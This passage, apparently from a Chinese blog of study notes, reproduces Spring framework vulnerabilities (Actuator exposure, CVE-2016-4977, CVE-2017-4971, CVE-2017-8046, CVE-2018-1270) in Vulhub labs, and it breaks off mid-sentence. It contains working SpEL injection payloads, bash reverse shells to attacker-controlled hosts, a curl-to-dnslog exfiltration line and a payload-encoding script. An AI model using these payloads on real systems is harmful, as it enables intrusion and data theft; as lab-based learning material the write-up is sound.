<!-- build time:Sun Feb 07 2021 00:32:48 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="凌晨的信息安全之路" href="http://avenue.cool/rss.xml"><link rel="alternate" type="application/atom+xml" title="凌晨的信息安全之路" href="http://avenue.cool/atom.xml"><link rel="alternate" type="application/json" title="凌晨的信息安全之路" href="http://avenue.cool/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="CVE漏洞复现"><link rel="canonical" href="http://avenue.cool/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%7Fspring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/"><title>spring框架漏洞复现集合 - CVE漏洞复现 | Avenue-le = 凌晨的信息安全之路 = Avenue-le</title><meta name="generator" content="Hexo 4.2.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">spring框架漏洞复现集合</h1><div class="meta"><span class="item" title="创建时间：2021-02-04 15:30:59"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2021-02-04T15:30:59+08:00">2021-02-04</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>13k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>12 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Avenue-le</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicitspjpbj20zk0m81ky.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclj9410cj20zk0m8h12.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeun65urj20zk0m81ii.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclwrdwyaj20zk0m8are.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeu7txpzj20zk0m81kx.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="item" rel="index" title="分类于 CVE漏洞复现"><span itemprop="name">CVE漏洞复现</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://avenue.cool/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%7Fspring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Avenue-le"><meta itemprop="description" content="Avenue-le, 凌晨的信息安全之路 & 随学"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="凌晨的信息安全之路"></span><div class="body md" itemprop="articleBody"><div class="note info"><p>以下为个人学习笔记和学习整理</p></div><h2 id="框架简介"><a class="anchor" href="#框架简介">#</a> 框架简介</h2><p>Spring 是 Java EE 编程领域的一个轻量级开源框架，该框架由一个叫 Rod Johnson 的程序员在 2002 年最早提出并随后创建，是为了解决企业级编程开发中的复杂性，业务逻辑层和其他各层的松耦合问题，因此它将面向接口的编程思想贯穿整个系统应用，实现敏捷开发的应用型框架。框架的主要优势之一就是其分层架构，分层架构允许使用者选择使用哪一个组件，同时为 J2EE 应用程序开发提供集成的框架。</p><h2 id="spring体系结构"><a class="anchor" href="#spring体系结构">#</a> spring 体系结构</h2><p>Spring 框架整体被分为 7 个模块：核心容器 (core container)、 面向切面编程 (aop)、数据访问 (date access)、web 层、test（测试）、消息传输（Messaging）、植入（Instrumentation）模块。<br>Spring4 去掉了 spring3 中的 struts, 添加了 messaging 和 websocket, 其他模块保持不变<br>Spring 的 jar 包大约 20 个，每个都有相应的功能，一个 jar 还可能依赖了若干其他 jar, 所以搞清楚它们之间的关系，配置 maven 依赖就可以简洁明了。</p><p>Spring 体系结构如下图：<br><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/1.jpg" alt=""></p><h3 id="core核心容器"><a class="anchor" href="#core核心容器">#</a> core 核心容器</h3><p>core 部分包含 4 个模块：<br>pring-core：提供了框架的基本组成部分，IoC 与 DI 的最基本实现 。<br>spring-beans：提供了 BeanFactory，是工厂模式的一个经典实现，Spring 将管理对象称为 Bean。<br>spring-context：建立在 Core 和 Beans 模块的基础之上，提供一个框架式的对象访问方式，是访问定义和配置的任何对象的媒介。ApplicationContext 接口是 Context 模块的焦点。<br>spring-expression：提供了强大的表达式语言去支持运行时查询和操作对象图。这是对 JSP2.1 规范中规定的统一表达式语言（Unified EL）的扩展。该语言支持设置和获取属性值、属性分配、方法调用、访问数组、集合和索引器的内容、逻辑和算术运算、变量命名以及从 Spring 的 IOC 容器中以名称检索对象。它还支持列表投影、选择以及常用的列表聚合。</p><p>IOC:（Inverse of Control 反转控制）控制反转：当一个对象创建时，它所依赖的对象由外部传递给他，而非自己去创建所依赖的对象 (比如通过 new 操作); 将对象的创建权，交由 Spring 完成。</p><p>DI: 依赖注入，依赖：一个对象完成业务功能需要依赖另一个对象，比如 service 功能需要依赖于 dao，注入：就是在获取一个对象时，该对象所依赖的实例已经由 spring 替我们分配了。</p><p>因为 spring-core 依赖了 commons-logging，而其他模块都依赖了 spring-core，所以整个 spring 框架都依赖了 commons-logging，如果有自己的日志实现如 log4j，可以排除对 commons-logging 的依赖，没有日志实现而排除了 commons-logging 依赖，编译报错</p><h3 id="aop-面向切面编程"><a class="anchor" href="#aop-面向切面编程">#</a> aop 面向切面编程</h3><p>aop 部分包含 4 个模块：<br>spring-aop：提供了一个符合 AOP 要求的面向切面的编程实现，允许定义方法拦截器和切入点，将代码按照功能进行分离，以便干净地解耦。<br>spring-aspects：集成 AspectJ<br>spring-instrument：提供一些类级的工具支持和 ClassLoader 级的实现，用于服务器<br>spring-instrument-tomcat：针对 tomcat 的 instrument 实现 (包含了 spring 的 tomcat 设备代理)</p><h3 id="数据访问data-access"><a class="anchor" href="#数据访问data-access">#</a> 数据访问 (data access)</h3><p>data access 部分包含 5 个模块：<br>spring-jdbc：jdbc 的支持，提供了一个 JDBC 的抽象层，消除了烦琐的 JDBC 编码和数据库厂商特有的错误代码解析。<br>spring-tx：事务控制，支持用于实现特殊接口和所有 POJO（普通 Java 对象）类的编程和声明式事务管理。<br>spring-orm：为流行的对象关系映射（Object-Relational Mapping）API 提供集成层，包括 JPA 和 Hibernate。使用 Spring-orm 模块可以将这些 O/R 映射框架与 Spring 提供的所有其他功能结合使用，例如声明式事务管理功能。<br>spring-oxm：提供了一个支持对象 / XML 映射的抽象层实现，例如 JAXB、Castor、JiBX 和 XStream。<br>spring-jms：指 Java 消息传递服务，包含用于生产和使用消息的功能。自 Spring4.1 以后，提供了与 Spring-messaging 模块的集成。</p><h3 id="web层"><a class="anchor" href="#web层">#</a> web 层</h3><p>web 包含 4 个模块：<br>spring-web：提供了基本的 Web 开发集成功能，例如多文件上传功能、使用 Servlet 监听器初始化一个 IOC 容器以及 Web 应用上下文。<br>spring-webmvc：也称为 Web-Servlet 模块，包含用于 web 应用程序的 Spring MVC 和 REST Web Services 实现。Spring MVC 框架提供了领域模型代码和 Web 表单之间的清晰分离，并与 Spring Framework 的所有其他功能集成。<br>spring-webmvc-portlet：基于 portlet 的 mvc 实现<br>spring-websocket：Spring4.0 以后新增的模块，它提供了 WebSocket 和 SocketJS 的实现，为 web 应用提供的高效通信工具。</p><h3 id="test测试"><a class="anchor" href="#test测试">#</a> test（测试）</h3><p>test 部分只有一个模块，我将 spring-context-support 也放在这里<br>spring-test：spring 测试，提供 junit 与 mock 测试功能 0o<br>spring-context-support：spring 额外支持包，比如邮件服务、视图解析等</p><h3 id="消息传输messaging"><a class="anchor" href="#消息传输messaging">#</a> 消息传输（Messaging）</h3><p>Spring4.0 以后新增了消息（Spring-messaging）模块，该模块提供了对消息传递体系结构和协议的支持。</p><h2 id="框架特征"><a class="anchor" href="#框架特征">#</a> 框架特征</h2><p>1、如果 Web 应用程序的 favicon.ico 图标默认没有更改，是一个小绿叶。</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/2.jpg" alt="spring"></p><p>2、如果 web 应用开发者没有修改 SpringBoot Web 应用的默认 4xx、5xx 报错页面，那么当 web 应用程序出现 4xx、5xx 错误时，会报错如下图：</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/3.jpg" alt="spring"></p><p>3、根据浏览器的 wappalyzer 插件，识别出 spring 框架。</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/4.jpg" alt="spring"></p><p>4、根据 F12 查看相应包的内容，有没有关于 spring 的。</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/5.jpg" alt="spring"></p><p>5、枚举执行器端点路径。这个其实很简单，在确认当前 web 站点是 springboot 框架后，枚举当前站点的所有一级、二级甚至三级目录，然后写脚本对每个目录进行探测，查看目录下是否存在 actuator 执行端点路径即可。</p><h2 id="springboot之actuator配置不当的漏洞利用"><a class="anchor" href="#springboot之actuator配置不当的漏洞利用">#</a> Springboot 之 actuator 配置不当的漏洞利用</h2><h3 id="actuator-简介"><a class="anchor" href="#actuator-简介">#</a> Actuator 简介</h3><p>Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。Actuator 配置不当导致应用系统监控信息泄露对应用系统及其用户的危害是巨大的，然而关于 springboot 框架下 actuator 配置不当的漏洞利用分析文章很少。</p><h3 id="对应路径泄露信息造成的危害"><a class="anchor" href="#对应路径泄露信息造成的危害">#</a> 对应路径泄露信息造成的危害</h3><pre><code>Http 方法	      路径	                描述
get            	/autoconfig       提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过            
get             /configprops      描述配置属性（包含默认值）如何注入 Bean            
get            	/beans            描述应用程序上下文里全部的 Bean，以及它们的关系            
get            	/dump             获取线程活动的快照            
get            	/env              获取全部环境属性            
get            	/env/{name}       根据名称获取特定的环境属性值            
get            	/health           报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供            
get            	/info             获取应用程序的定制信息，这些信息由 info 打头的属性提供            
get            	/mappings         描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系            
get            	/metrics          报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数            
get            	/metrics/{name}   报告指定名称的应用程序度量值            
post            /shutdown         关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）        
get            	/trace            提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）                
</code></pre><h3 id="产生原因"><a class="anchor" href="#产生原因">#</a> 产生原因</h3><p>此漏洞是因为开发人员配置不当，将接口暴漏在公网上并且没有配置访问控制权限而产生的信息泄露</p><h3 id="trace-路径下除了记录有基本的-http-请求信息时间戳-http-头等还有用户-token-cookie-字段"><a class="anchor" href="#trace-路径下除了记录有基本的-http-请求信息时间戳-http-头等还有用户-token-cookie-字段">#</a> ./trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP 头等），还有用户 token、cookie 字段：</h3><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/6.jpg" alt="spring"></p><h3 id="autoconfig路径下记录哪些自动配置条件通过了哪些没通过"><a class="anchor" href="#autoconfig路径下记录哪些自动配置条件通过了哪些没通过">#</a> ./autoconfig 路径下，记录哪些自动配置条件通过了，哪些没通过。</h3><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/7.jpg" alt="spring"></p><h3 id="env路径下这里一般会存放一些环境配置信息如java版本数据账号密码开放端口启动方式等信息"><a class="anchor" href="#env路径下这里一般会存放一些环境配置信息如java版本数据账号密码开放端口启动方式等信息">#</a> ./env 路径下，这里一般会存放一些环境配置信息如 java 版本，数据账号密码，开放端口，启动方式等信息。</h3><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/8.jpg" alt="spring"></p><h3 id="configprops路径下用来获取应用中配置的属性信息"><a class="anchor" href="#configprops路径下用来获取应用中配置的属性信息">#</a> ./configprops 路径下，用来获取应用中配置的属性信息</h3><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/9.jpg" alt="spring"></p><h3 id="heapdump-路径下访问heapdump-路径返回-gzip-压缩-hprof-堆转储文件-在-android-studio-打开会泄露站点内存信息很多时候会包含后台用户的账号密码这个就不放图了"><a class="anchor" href="#heapdump-路径下访问heapdump-路径返回-gzip-压缩-hprof-堆转储文件-在-android-studio-打开会泄露站点内存信息很多时候会包含后台用户的账号密码这个就不放图了">#</a> ./heapdump 路径下，访问 /heapdump 路径，返回 GZip 压缩 hprof 堆转储文件。在 Android studio 打开，会泄露站点内存信息，很多时候会包含后台用户的账号密码。这个就不放图了</h3><h2 id="spring-security-oauth2-远程命令执行漏洞cve-2016-4977"><a class="anchor" href="#spring-security-oauth2-远程命令执行漏洞cve-2016-4977">#</a> Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）</h2><h3 id="漏洞描述"><a class="anchor" href="#漏洞描述">#</a> 漏洞描述</h3><p>Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了 Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。</p><h3 id="影响范围"><a class="anchor" href="#影响范围">#</a> 影响范围</h3><pre><code>Spring Security OAuth 2.0 – 2.0.9
Spring Security OAuth 1.0 – 1.0.5
</code></pre><h3 id="复现过程"><a class="anchor" href="#复现过程">#</a> 复现过程</h3><p>注：本次漏洞复现集合全部采用 Vulhub 环境</p><p>执行如下命令启动漏洞环境：</p><pre><code>docker-compose up -d
</code></pre><p>启动完成后，访问 http://your-ip:8080 / 即可看到 web 页面。</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/10.jpg" alt="spring"></p><p>验证漏洞是否存在：(用户和密码都是 admin)</p><pre><code>oauth/authorize?response_type=${2*2}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test   返回其中计算的值
</code></pre><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/11.jpg" alt="spring"></p><p>对反弹 shell 的 POC 进行 base64 编码（java 反弹 shell 都需要先编码，不然不会成功，runtime 不支持管道符）<br>加密地址：<span class="exturl" data-url="aHR0cDovL3d3dy5qYWNrc29uLXQuY2EvcnVudGltZS1leGVjLXBheWxvYWRzLmh0bWw=">http://www.jackson-t.ca/runtime-exec-payloads.html</span></p><p><code>bash -i &gt;&amp; /dev/tcp/192.168.0.105/6666 0&gt;&amp;1</code></p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/12.jpg" alt="spring"></p><p>在用 POC 生成一个脚本代码<br><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/13.jpg" alt="spring"></p><p>POC 脚本：</p><pre><code>#!/usr/bin/env python

message = input('Enter message to encode:')

poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])

for ch in message[1:]:
   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)

poc += ')}'

print(poc)
</code></pre><p>然后把 poc 复制给 reponse_type 传参的值，然后使用自己的 vps 监听 6666 端口</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/14.jpg" alt="spring"></p><p>成功反弹 shell<br><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/15.jpg" alt="spring"></p><p>我们也可以使用 dnslog 来返回执行命令的结果，需要使用 dns 平台</p><p>使用 curl 执行命令，返回给 dnslong<br><code>curl `whoami`.gc7qj5.dnslog.cn</code> 对其进行 base64 编码后再使用 poc 脚本生成代码</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/16.jpg" alt="spring"></p><p>然后把 poc 复制给 reponse_type 传参的值，此时查看 dnslog 的结果</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/17.jpg" alt="spring"></p><h2 id="spring-webflow-远程代码执行漏洞cve-2017-4971"><a class="anchor" href="#spring-webflow-远程代码执行漏洞cve-2017-4971">#</a> Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</h2><h3 id="漏洞描述-2"><a class="anchor" href="#漏洞描述-2">#</a> 漏洞描述：</h3><p>Spring WebFlow 构建于 Spring MVC 之上，允许实现 Web 应用程序的 “流程”。流程封装了一系列步骤，指导用户执行某些业务任务。　它的最佳位置是具有受控导航功能的有状态 Web 应用程序，例如购物逻辑，向表单添加确认步骤等。如果我们控制了数据绑定时的 field，构造恶意 SpEL 表达式来远程执行命令。</p><h3 id="影响范围-2"><a class="anchor" href="#影响范围-2">#</a> 影响范围：</h3><p>Spring WebFlow 2.4.0 - 2.4.4</p><h3 id="复现过程-2"><a class="anchor" href="#复现过程-2">#</a> 复现过程：</h3><p>注：本次漏洞复现集合全部采用 Vulhub 环境</p><p>执行如下命令启动漏洞环境：</p><pre><code>docker-compose up -d
</code></pre><p>启动完成后，访问 http://your-ip:8080 / 即可看到 web 页面。</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/18.jpg" alt="spring"></p><p>点击 login 随便选用一个账号密码进行登录，然后访问 id 为 1 的酒店 http://your-ip:8080/hotels/1，点击预订按钮 “Book Hotel”，填写相关信息后点击 “Process”（从这一步，其实 WebFlow 就正式开始了）</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/19.jpg" alt="spring"></p><p>点击 Confirm 进行抓包，抓到一个 POST 数据包，我们向其中添加一个字段（也就是反弹 shell 的 POC）：</p><pre><code>_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/VPS/PORT 0&gt;&amp;1&quot;)).start()=vulhub
</code></pre><p>注意：bash 反弹 shell 不能把 \ 给 URL 编码，否则 shell 会反弹失败</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/20.jpg" alt="spring"></p><p>此时成功反弹 shell</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/21.jpg" alt="spring"></p><h2 id="spring-data-rest-远程命令执行漏洞cve-2017-8046"><a class="anchor" href="#spring-data-rest-远程命令执行漏洞cve-2017-8046">#</a> Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）</h2><h3 id="漏洞描述-3"><a class="anchor" href="#漏洞描述-3">#</a> 漏洞描述：</h3><p>Spring Data 是对数据访问的更高抽象。通过它，开发者进一步从数据层解放出来，更专注于业务逻辑。Spring Data REST 是一个构建在 Spring Data 之上，为了帮助开发者更加容易地开发 REST 风格的 Web 服务。在 REST API 的 Patch 方法中，path 的值被传入 setValue，导致执行了恶意 SpEL 表达式，触发远程命令执行漏洞。</p><h3 id="影响范围-3"><a class="anchor" href="#影响范围-3">#</a> 影响范围：</h3><p>Spring Data REST versions &lt; 2.5.12, 2.6.7, 3.0 RC3<br>Spring Boot version &lt; 2.0.0M4<br>Spring Data release trains &lt; Kay-RC3</p><h3 id="复现过程-3"><a class="anchor" href="#复现过程-3">#</a> 复现过程：</h3><p>注：本次漏洞复现集合全部采用 Vulhub 环境</p><p>执行如下命令启动漏洞环境：</p><pre><code>docker-compose up -d
</code></pre><p>启动完成后，访问 http://your-ip:8080 / 即可看到 web 页面。</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/22.jpg" alt="spring"></p><p>知识点：<br>Get: 从服务器端获取数据，请求 body 在地址栏上<br>Post: 向服务器端提交数据，请求数据在报文 body 里发送一个修改数据的请求，需求数据要从新创建<br>Put: 向服务器端提交数据，请求数据在报文 body 里发送一个修改数据的请求，需求数据更新（全部更新）<br>Patch: 向服务器端提交数据，请求数据在报文 body 里发送一个修改数据的请求，需求数据更新（部分更新）<br>Delete: 向服务器端提交数据，请求数据在报文 body 里发送一个删除数据的请求</p><p>抓包修改 OPTIONS，查看接受类型和允许的请求方法。</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/23.jpg" alt="spring"><br>首先注意几点：<br>1.Content-Type:application/json-patch+json<br>2. 请求数据必须是 json 数组<br>3.JSON Patch 方法提交的数据必须包含一个 path 成员，用于定位数据，同时还必须包含 op 成员，可选值如下：</p><pre><code>op	                含义
add	               添加数据
remove	            删除
replace	            修改
move	            移动
copy	            拷贝
test	       测试给定数据与指定位置数据是否相等
</code></pre><p>访问 http://your-ip:8080/customers/1，看到一个资源。我们使用 PATCH 请求来修改之：</p><pre><code>[{ &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; }]
</code></pre><p>先将 POC 使用工具进行转义，在使用脚本将转义后的 POC 用脚本转换成十进制</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/24.jpg" alt="spring"></p><pre><code>payload = b'要执行的命令'
bytecode = ','.join(str(i) for i in list(payload))
print(bytecode)
</code></pre><p>将转换成的十进制带入 byte 中</p><pre><code>[{ &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,65,117,77,84,65,49,76,122,89,50,78,106,89,103,77,68,52,109,77,81,61,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; }]
</code></pre><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/25.jpg" alt="spring"></p><p>此时成功反弹 shell<br><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/26.jpg" alt="spring"></p><h2 id="spring-messaging-远程命令执行漏洞cve-2018-1270"><a class="anchor" href="#spring-messaging-远程命令执行漏洞cve-2018-1270">#</a> Spring Messaging 远程命令执行漏洞（CVE-2018-1270）</h2><h3 id="漏洞描述-4"><a class="anchor" href="#漏洞描述-4">#</a> 漏洞描述：</h3><p>spring messaging 为 spring 框架提供消息支持，其上层协议是 STOMP，底层通信基于 SockJS，用 STOMP 协议将数据组合成一个文本流，简单来说用 sockjs 协议发送文本流，sockjs 会选择一个合适的通道：websocket (NEW) 或 ajax (OLD) 进与后端通信。由于 selector 用 SpEL 表达式编写，并使用 StandardEvaluationContext 解析 (权限太大)，造成命令执行漏洞。</p><h3 id="影响范围-4"><a class="anchor" href="#影响范围-4">#</a> 影响范围：</h3><p>Spring Framework 5.0 -5.0.4<br>Spring Framework 4.3 - 4.3.14</p><h3 id="复现过程-4"><a class="anchor" href="#复现过程-4">#</a> 复现过程：</h3><p>注：本次漏洞复现集合全部采用 Vulhub 环境</p><p>执行如下命令启动漏洞环境：</p><pre><code>docker-compose up -d
</code></pre><p>启动完成后，访问 http://your-ip:8080 / 即可看到 web 页面。</p><p><img data-src="/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/28.jpg" alt="spring"></p><p>网上大部分文章都说 spring messaging 是基于 websocket 通信，其实不然。spring messaging 是基于 sockjs（可以理解为一个通信协议），而 sockjs 适配多种浏览器：现代浏览器中使用 websocket 通信，老式浏览器中使用 ajax 通信。</p><p>连接后端服务器的流程，可以理解为：</p><p>用 STOMP 协议将数据组合成一个文本流<br>用 sockjs 协议发送文本流，sockjs 会选择一个合适的通道：websocket 或 xhr (http)，与后端通信<br>所以我们可以使用 http 来复现漏洞，称之为 “降维打击”。</p><p><span class="exturl" data-url="aHR0cDovL3huLS1QT0NleHBsb2l0LXBmMnB5cHEyYjEyMGFucWdoODlkY2ZzOTk2ZHcxdHBtcTU0ai5weQ==">我编写了一个简单的 POC 脚本 exploit.py</span>（需要用 python3.6 执行），因为该漏洞是订阅的时候插入 SpEL 表达式，而对方向这个订阅发送消息时才会触发，所以我们需要指定的信息有：</p><p>基础地址，在 vulhub 中为 http://your-ip:8080/gs-guide-websocket<br>待执行的 SpEL 表达式，如 T (java.lang.Runtime).getRuntime ().exec ('touch /tmp/success')<br>某一个订阅的地址，如 vulhub 中为：/topic/greetings<br>如何触发这个订阅，即如何让后端向这个订阅发送消息。在 vulhub 中，我们向 /app/hello 